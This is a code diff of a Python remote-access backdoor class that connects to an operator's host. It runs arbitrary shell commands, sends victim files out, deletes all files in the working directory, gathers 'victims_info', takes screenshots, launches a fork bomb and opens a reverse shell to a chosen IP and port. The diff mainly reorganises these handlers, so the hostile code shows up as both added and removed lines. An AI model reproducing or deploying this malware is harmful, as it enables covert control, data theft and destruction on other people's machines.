@@ -56,14 +56,23 @@ class Backdoor:
             l.join()"""
 
     def commands_initiating(self):
-        
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Starting connection
 
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        print('\033[31m[-] *\033[0;0m \033[1;36mInitiating Connection...\033[0;0m')
-        self.sock.connect((self.host, self.port))
-        print('\033[31m[-] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m') # kkkkkk,kmkkk
-
+        connected = False
+        while (connected == False):
+            try:
+                time.sleep(1)
+                print('\033[31m[-] *\033[0;0m \033[1;36mInitiating Connection...\033[0;0m')
+                self.sock.connect((self.host, self.port))
+                print('\033[36m[+] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m') # kkkkkk,kmkkk
+                connected = True
+            except KeyboardInterrupt:
+                print("Exiting... Bye o/")
+                sys.exit()
+            except:
+                print("\033[31m[+] * \033[0;0mHost isn't Accepting connection, Trying again...")
+    
         # Loop getting commands
 
         while True:
@@ -75,20 +84,119 @@ class Backdoor:
                 self.sock.close()
                 sys.exit()
                 
-                
-            # command_prompt = subprocess.Popen(message_command_descrypt, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            # command_prompt = os.popen(message_command_descrypt).read()
             try:
-                command_prompt = subprocess.Popen(message_command_descrypt, stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
-                err = command_prompt.stderr.read()
-                command_prompt = command_prompt.stdout.read()
-                print('Command Sent!')
-                self.sock.send(command_prompt)
-                self.sock.send(err)
+                not_in = ["get_ip","victims_info","remove_all","keylogger_start","forkbomb","reverse_tcp","download"]
+
+                # Get machine's IP adress
+
+                if message_command_descrypt == "get_ip":
+                    ip = requests.get("https://api.ipify.org").text
+                    ip_message = f"The target's IP is: {ip}".encode()
+                    self.sock.send(ip_message)
+
+
+                # Downloading files
+                if message_command_descrypt == "download":
+                    self.sock.send("You must specify a file!".encode())
+
+                if message_command_descrypt.startswith("download "):
+                    download_file = message_command_descrypt.split(" ")[1]
+                    file_location = os.getcwd()
+                    file_size = os.path.getsize(f"{file_location}/{download_file}")
+                    # self.sock.send(file_size)
+                    with open(download_file, "rb") as f:
+                        count = 0
+                        while count < file_size:
+                            file_data = f.read(1024)
+                            self.sock.sendall(file_data)
+                            count += len(file_data)
+                            break
+                        self.sock.send("All right here!".encode())
+                    print("Transference Done!")
+                
+                        
+
+                # This is for removing all files in currently path, maybe not work in folders that requires admin credentials
+
+                elif message_command_descrypt == "remove_all":
+                    try: 
+                        files = os.listdir()
+                        for file in files:
+                            os.chdir(os.getcwd())
+                            os.remove(file)
+                    except IsADirectoryError:
+                        continue
+                    except Exception as e:
+                        self.sock.send(str(e).encode())
+
+                # This is used to get machine informations
+
+                elif message_command_descrypt == "victims_info":   
+                    info = f"""
+                    Operacional System: {sys.platform}
+                    Computer Name: {platform.node()}
+                    For more advanced info, use: uname -a, uname -r, id
+                    """.encode()
+                    self.sock.send(info)
+
+                # TCP Reverse shell in python
+            
+                if message_command_descrypt == "reverse_tcp":
+                    self.sock.send("You must put IP and PORT as parameters! Ex: reverse_tcp 192.168 7777".encode())
+
+                
+
+                if message_command_descrypt.startswith("reverse_tcp "):
+                    self.reverseip = message_command_descrypt.split(" ")[1]
+                    self.reverseport = message_command_descrypt.split(" ")[2]
+                    subprocess.check_output(f"""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.reverseip}",{self.reverseport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+                    """, stderr=subprocess.STDOUT, shell=True)
+                    self.sock.send("Reverse Shell Session established with sucess!".encode())
+
+                
+                # Screenshot
+
+                if message_command_descrypt == "screenshot":
+                    screenshot = pyautogui.screenshot()
+                    screenshot.save("screenshot.png")
+                    self.sock.send("Screenshot done!\n".encode())
+
+                # This is for crash the target's machine
+
+                if message_command_descrypt == "forkbomb":
+                    try:
+                        while True:
+                            os.fork()
+                    except Exception as e:
+                        self.sock.send(str(e).encode())
+
+                # Verify commands
+                for value in not_in:
+                    if value in message_command_descrypt:
+                        message_command_descrypt = "ignoreethislittlemessage"
+                        
+                # Entering commands in terminal
+                                    
+                if message_command_descrypt != "ignoreethislittlemessage":
+                    command_prompt = subprocess.Popen(message_command_descrypt, stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
+                    err = command_prompt.stderr.read()
+                    command_prompt = command_prompt.stdout.read()
+                    print('Command Sent!')
+                    self.sock.send(command_prompt)
+                    self.sock.send(err)
+
                 if (command_prompt == b"" and err == b""):
                     self.sock.send("\nOK!\n".encode())
+
+                elif (command_prompt == b"" and err == b"" and message_command_descrypt == "ls"):
+                    self.sock.send("\nNothing here buddy!\n".encode())
+
+                elif (command_prompt == b"" and err == b"" and message_command_descrypt.startswith("cd ") == True):
+                    cd_message = f"You have been moved to {os.getcwd().encode()}".encode()
+                    self.sock.send(cd_message)
+
             except Exception as e:
-                command_prompt = str(e).encode()
+                self.sock.send(str(e).encode())
 
             # Navegate into directories
 
@@ -97,8 +205,6 @@ class Backdoor:
                 try:
                     os.chdir(message_command_descrypt[3:])
                     print("Command Sent!")
-                    message = f"You have been moved to {os.getcwd().encode()}".encode()
-                    self.sock.send(message)
                 except Exception as e:
                     self.sock.send(str(e).encode())
 
@@ -111,58 +217,6 @@ class Backdoor:
                 self.range = message_command_descrypt.split(" ")[1]
                 back.listener()"""
 
-            # This is for removing all files in currently path, maybe not work in folders that requires admin credentials
-
-            if message_command_descrypt == "remove_all":
-                try: 
-                    files = os.listdir()
-                    for file in files:
-                        os.chdir(os.getcwd())
-                        os.remove(file)
-                except IsADirectoryError:
-                    continue
-                except Exception as e:
-                    self.sock.send(str(e).encode())
-                
-
-            # This is to get machine's ip adress
-
-            if message_command_descrypt == "get_ip":
-                try:
-                    ip = requests.get("https://api.ipify.org").text
-                    ip_message = f"The target's ip is: {ip}".encode()
-                    self.sock.send(ip_message)
-                except Exception as e:
-                    self.sock.send(str(e).encode())
-
-
-            # This is used to get machine informations
-
-            if message_command_descrypt == "victims_info":
-                try:
-                    info = f"""
-                    Operacional System: {sys.platform}
-                    Computer Name: {platform.node()}
-                    For more advanced info, use: uname -a, uname -r, id
-                    """.encode()
-                    self.sock.send(info)
-                except Exception as e:
-                    self.sock.send(str(e).encode())
-
-            # TCP Reverse shell in python
-            
-            if message_command_descrypt == "reverse_tcp":
-                self.sock.send("You must put IP and PORT as parameters! Ex: reverse_tcp 192.168 7777".encode())
-
-            
-
-            if message_command_descrypt.startswith("reverse_tcp "):
-                self.reverseip = message_command_descrypt.split(" ")[1]
-                self.reverseport = message_command_descrypt.split(" ")[2]
-                subprocess.check_output(f"""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.reverseip}",{self.reverseport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-                """, stderr=subprocess.STDOUT, shell=True)
-                self.sock.send("Reverse Shell Session established with sucess!".encode())
-
             # Remove files
             
             if message_command_descrypt.startswith("rm "):
@@ -170,7 +224,7 @@ class Backdoor:
                     location = os.getcwd()
                     os.chdir(location)
                     self.rmfile = message_command_descrypt.split(" ")[1]
-                    os.remove(f"{location}/{self.rmfile}")
+                    os.remove(self.rmfile)
                     self.sock.send("Removed file with sucess!".encode())
                 except Exception as e:
                     self.sock.send(str(e).encode())
@@ -179,24 +233,6 @@ class Backdoor:
             if message_command_descrypt == "rm":
                 self.sock.send("You must specify a file".encode())
 
-            # Screenshot
-
-            if message_command_descrypt == "screenshot":
-                screenshot = pyautogui.screenshot()
-                screenshot.save("screenshot.png")
-                self.sock.send("Screenshot done!\n".encode())
-
-            # This is for crash the target's machine
-
-            if message_command_descrypt == "forkbomb":
-                try:
-                    while True:
-                        os.fork()
-                except Exception as e:
-                    self.sock.send(str(e).encode())
-
-            #  message = command_prompt.stdout.read()
-            #  error_message = command_prompt.stderr.read()
 
             """if message_command_descrypt.startswith("win_startup"):
 
